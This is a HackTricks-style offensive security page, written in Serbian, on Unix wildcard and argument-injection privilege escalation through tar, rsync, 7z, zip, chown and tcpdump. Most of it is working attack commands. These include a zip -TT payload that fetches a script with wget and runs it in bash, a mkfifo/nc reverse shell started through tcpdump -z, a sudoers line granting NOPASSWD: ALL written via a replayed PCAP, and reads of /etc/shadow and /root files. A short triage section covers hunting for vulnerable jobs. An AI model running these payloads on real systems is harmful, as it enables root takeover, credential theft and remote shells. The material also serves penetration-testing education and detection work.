# Dodatni trikovi sa Wildcards

{{#include ../../banners/hacktricks-training.md}}

> **argument injection** pomoću Wildcard-a (poznatog i kao *glob*) dešava se kada privilegovana skripta pokrene Unix binary kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa nepostojećim navodnicima oko wildcard-a, kao što je `*`.
> Pošto shell proširuje wildcard **pre** izvršavanja binary-ja, napadač koji može da kreira fajlove u radnom direktorijumu može da napravi nazive fajlova koji počinju znakom `-`, tako da se oni tumače kao **opcije umesto podataka**, čime se efektivno ubacuju proizvoljni flagovi ili čak komande.
> Ova stranica prikuplja najkorisnije primitive, novija istraživanja i moderne metode detekcije za period 2023-2025.

## chown / chmod

Možete **kopirati vlasnika/grupu ili bitove dozvola proizvoljnog fajla** zloupotrebom `--reference` flag-a:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` se ubacuje, zbog čega *sve* datoteke koje se podudaraju nasleđuju vlasništvo/dozvole datoteke `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
Pogledajte i klasični DefenseCode rad za detalje.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Izvršite proizvoljne komande zloupotrebom funkcije **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava kao root.

### bsdtar / macOS 14+

Podrazumevani `tar` na novijim verzijama macOS-a (zasnovan na `libarchive`) *ne implementira* `--checkpoint`, ali i dalje možete postići izvršavanje koda pomoću opcije **--use-compress-program**, koja omogućava navođenje eksternog kompresora.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kada privilegovana skripta pokrene `tar -cf backup.tar *`, biće pokrenut `/bin/sh`.

---

## rsync

`rsync` vam omogućava da zamenite remote shell ili čak remote binary pomoću command-line flagova koji počinju sa `-e` ili `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum pomoću `rsync -az * backup:/srv/`, ubačeni flag pokreće vaš shell na udaljenoj strani.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovani script *defanzivno* dodaje `--` ispred wildcard-a (kako bi sprečio parsiranje opcija), 7-Zip format podržava **file list files** tako što se ispred imena fajla doda `@`. Kombinovanjem toga sa symlink-om možete da *exfiltrate*-ujete proizvoljne fajlove:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvrši nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu fajlova i prekinuće rad, **ispisujući sadržaj na stderr**.

Ovo funkcioniše i uz `-- *`, zato što 7-Zip CLI izričito prihvata i obične nazive fajlova i `@listfiles` kao pozicione ulaze, pa se literalni naziv fajla kao što je `@root.txt` i dalje posebno tretira.

---

## zip

Postoje dva veoma praktična primitiva kada aplikacija prosleđuje nazive fajlova pod kontrolom korisnika komandi `zip` (bilo putem wildcard-a ili nabrajanjem naziva bez `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE putem test hook-a: `-T` omogućava “test archive”, a `-TT <cmd>` zamenjuje tester proizvoljnim programom (duži oblik: `--unzip-command <cmd>`). Ako možete da ubacite nazive fajlova koji počinju znakom `-`, podelite flags između različitih naziva fajlova kako bi parsing short-options funkcionisao:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Napomene
- NE pokušavajte sa jednim nazivom datoteke poput `'-T -TT <cmd>'` — kratke opcije se obrađuju znak po znak i to neće uspeti. Koristite odvojene tokene kao što je prikazano.
- Ako aplikacija uklanja kose crte iz naziva datoteka, preuzmite sadržaj sa osnovnog hosta/IP adrese (podrazumevana putanja je `/index.html`) i sačuvajte ga lokalno pomoću `-O`, a zatim ga izvršite.
- Možete otklanjati greške u parsiranju pomoću `-sc` (prikazuje obrađeni argv) ili `-h2` (više pomoći) da biste razumeli kako se vaši tokeni obrađuju.

Primer (lokalno ponašanje na zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ako web sloj prikazuje `zip` stdout/stderr (što je uobičajeno kod naivnih wrappera), injected flags poput `--help` ili greške izazvane neispravnim opcijama pojaviće se u HTTP odgovoru, potvrđujući command-line injection i olakšavajući prilagođavanje payload-a.

---

## Dodatni binary-ji ranjivi na wildcard injection (kratka lista za period 2023-2025)

Sledeće komande su zloupotrebljavane u modernim CTF-ovima i realnim okruženjima. Payload se uvek kreira kao *filename* unutar writable direktorijuma koji će kasnije biti obrađen pomoću wildcard-a:

| Binary | Flag za zloupotrebu | Efekat |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → proizvoljni `@file` | Čitanje sadržaja fajla |
| `flock` | `-c <cmd>` | Izvršavanje komande |
| `git`   | `-c core.sshCommand=<cmd>` | Izvršavanje komande kroz git preko SSH-a |
| `scp`   | `-S <cmd>` | Pokretanje proizvoljnog programa umesto ssh-a |

Ovi primitives su ređi od klasičnih *tar/rsync/zip* slučajeva, ali ih vredi proveriti tokom hunting-a.

---

## Pronalaženje ranjivih wrappera i jobova

Nedavne studije slučaja pokazale su da wildcard/argv injection više nije samo problem **cron + tar**.<sup>[[5]](#references)</sup> Ista klasa grešaka i dalje se pojavljuje u:

- web funkcijama koje „preuzimaju sve kao zip/tar“ iz upload direktorijuma pod kontrolom napadača
- debug shell-ovima dobavljača/uređaja koji izlažu **tcpdump** wrapper sa poljima za filename/filter pod kontrolom napadača
- backup ili rotation jobovima koji pozivaju `tar`, `rsync`, `7z`, `zip`, `chown` ili `chmod` nad writable direktorijumima

Korisne triage komande:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Brze heuristike:

- `-- *` je dobro rešenje za mnoge GNU alate, ali **ne** i za `7z`/`7za`, zato što se `@listfiles` obrađuju zasebno.
- Za `zip`, potražite wrapper-e koji direktno enumerišu filenames pod kontrolom korisnika; razdvajanje short-option opcija (`-T` + `-TT <cmd>`) i dalje funkcioniše čak i bez shell glob-a.
- Za `tcpdump` obratite posebnu pažnju na wrapper-e koji vam omogućavaju kontrolu **imena izlaznih fajlova**, **postavki rotacije** ili argumenata za replay capture fajlova.

---

## tcpdump rotation hooks (-G/-W/-z): RCE putem argv injection u wrapper-ima

Kada restricted shell ili vendor wrapper sastavlja `tcpdump` command line konkatenacijom polja pod kontrolom korisnika (npr. parametra „file name“) bez stroge validacije ili quoting-a, možete ubaciti dodatne `tcpdump` flags. Kombinacija opcija `-G` (rotacija zasnovana na vremenu), `-W` (ograničava broj fajlova) i `-z <cmd>` (komanda nakon rotacije) omogućava proizvoljno izvršavanje komandi kao korisnik koji pokreće tcpdump (često root na appliance-ima).<sup>[[1]](#references)[[4]](#references)</sup>

Preduslovi:

- Možete uticati na `argv` koji se prosleđuje programu `tcpdump` (npr. putem wrapper-a kao što je `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper ne sanitizuje razmake ili tokene koji počinju znakom `-` u polju za naziv fajla.

Klasični PoC (izvršava reverse shell script iz writable path-a):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalji:

- `-G 1 -W 1` nameće trenutnu rotaciju nakon prvog paketa koji se podudara.
- `-z <cmd>` pokreće post-rotate komandu jednom po rotaciji. Mnoge build verzije izvršavaju `<cmd> <savefile>`. Ako je `<cmd>` skripta/interpreter, proverite da rukovanje argumentima odgovara vašem payloadu.

Varijante bez removable media:

- Ako imate bilo koji drugi primitive za upisivanje fajlova (npr. zaseban command wrapper koji omogućava output redirection), postavite svoju skriptu na poznatu putanju i pokrenite `-z /bin/sh /path/script.sh` ili `-z /path/script.sh`, u zavisnosti od semantike platforme.
- Neki vendor wrapperi rotiraju fajlove na lokacije koje kontroliše attacker. Ako možete uticati na rotiranu putanju (symlink/directory traversal), možete usmeriti `-z` da izvrši sadržaj koji u potpunosti kontrolišete bez eksternog medija.

---

## sudoers: tcpdump sa wildcards/dodatnim argumentima → proizvoljan upis/čitanje i root

Veoma čest sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- Glob `*` i permisivni obrasci ograničavaju samo prvi `-w` argument. `tcpdump` prihvata više `-w` opcija; poslednja ima prednost.
- Pravilo ne ograničava druge opcije, pa su `-Z`, `-r`, `-V` itd. dozvoljene.

Primitivi
- Zamenite odredišnu putanju drugim `-w` (prvi samo ispunjava sudoers uslov):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal unutar prvog `-w` za izlazak iz ograničenog stabla:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Prisilno postavite vlasništvo nad izlazom pomoću `-Z root` (kreira datoteke u vlasništvu korisnika root bilo gde):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Upis proizvoljnog sadržaja ponovnim reprodukovanjem posebno napravljenog PCAP-a pomoću `-r` (npr. za dodavanje linije u sudoers):

<details>
<summary>Kreirajte PCAP koji sadrži tačan ASCII payload i upišite ga kao root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Čitanje proizvoljnih datoteka/curenje tajni sa `-V <file>` (tumači listu savefiles). Dijagnostika grešaka često ispisuje linije, čime se sadržaj otkriva:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Reference

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
